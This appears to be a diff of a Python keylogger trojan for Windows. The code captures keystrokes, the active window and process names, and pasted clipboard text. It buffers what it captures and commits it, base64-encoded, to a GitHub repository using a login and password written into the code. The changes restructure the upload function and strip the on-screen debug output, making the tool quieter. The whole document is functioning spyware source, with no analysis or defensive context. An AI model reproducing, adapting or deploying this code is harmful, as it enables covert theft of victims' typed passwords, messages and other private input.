@@ -18,21 +18,21 @@ stringa=""
 
 def store_module_result(data_str):
     if data_str==None:
-        exit()
-    print("--storing--")
-    gh = login(username="NotMeObviously", password="KristoWasH3RE")
-    repo = gh.repository("NotMeObviously", "chapter")
-    branch = repo.branch("master")
-    print("--connecting to GitHub--")
-    nameGit= random.randint(1000,10000)#"Key hour: %s - date: %s " % (time.strftime("%H:%M:%S"), time.strftime("%d/%m/%Y"))
-    remote_path = "data/%s/%d" %(trojan_id, nameGit )
-    #trasforma i dati da str a byte
-    #data_byte=data_str.encode("UTF-8","replace")
-    message = "Commit success!"
-    repo.create_file(remote_path, message, base64.b64encode(data_str))
-    print("--storing complete--")
-    exit()
     
+    else:
+        print("--storing--")
+        gh = login(username="NotMeObviously", password="KristoWasH3RE")
+        repo = gh.repository("NotMeObviously", "chapter")
+        branch = repo.branch("master")
+        print("--connecting to GitHub--")
+        nameGit= random.randint(1000,10000)#"Key hour: %s - date: %s " % (time.strftime("%H:%M:%S"), time.strftime("%d/%m/%Y"))
+        remote_path = "data/%s/%d" %(trojan_id, nameGit )
+        #trasforma i dati da str a byte
+        #data_byte=data_str.encode("UTF-8","replace")
+        message = "Commit success!"
+        repo.create_file(remote_path, message, base64.b64encode(data_str))
+        print("--storing complete--")
+
 
 def str_composer(messaggio):
     global stringa
@@ -41,9 +41,7 @@ def str_composer(messaggio):
     else:
         storeT=threading.Thread(target=store_module_result,args=(stringa,))
         storeT.start()
-        print("stringa pre: %s"%stringa)
         stringa=""
-        print("stringa: %s"%stringa)
 
 
 def get_current_process():
@@ -58,9 +56,6 @@ def get_current_process():
     psapi.GetModuleBaseNameA(h_process, None,byref(executable), 512)
     window_title = create_string_buffer("\x00" * 512)
     lenght = user32.GetWindowTextA(hwnd, byref(window_title), 512)
-    print("")
-    print("[ PID: %s - %s - %s ]" %(process_id, executable.value, window_title.value))
-    print("")
     mex="{PID:%s-%s-%s|" %(process_id, executable.value, window_title.value)
     str_composer(mex)
     kernel32.CloseHandle(hwnd)
@@ -78,7 +73,6 @@ def KeyStroke(event):
 
     if event.Ascii > 32 and event.Ascii < 127:
         mex=chr(event.Ascii)
-        print(mex), #virgola tutto sulla stessa riga
         str_composer(mex)
     else: 
         #se [Ctrl-V] recupera il testo
@@ -86,11 +80,9 @@ def KeyStroke(event):
             win32clipboard.OpenClipboard()
             pasted_value = win32clipboard.GetClipboardData()
             win32clipboard.CloseClipboard()
-            print("[P]-%s-" % pasted_value)
             str_composer(pasted_value)
         else:
             mex="[%s]" % event.Key
-            print(mex)
             str_composer(mex)
         
     return True
